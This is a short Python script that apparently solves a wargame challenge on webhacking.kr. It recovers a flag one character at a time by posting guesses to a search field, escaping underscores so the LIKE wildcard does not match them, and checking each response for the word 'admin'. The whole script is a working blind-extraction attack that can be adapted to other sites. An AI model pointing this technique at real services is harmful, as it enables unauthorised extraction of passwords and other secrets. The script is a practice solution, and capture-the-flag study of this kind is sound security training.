import requests
import string

url = "https://webhacking.kr/challenge/web-33/"


password = "FLAG{himiko_"
while True:    
    for c in "_"+string.ascii_letters+string.digits+"{"+"}"+"-"+"?":
        response = requests.post(url, data={"search": (password+c).replace("_", r"\_")})
        print(c)
        if "admin" in response.text:
            password += c
            print(password)
            break
    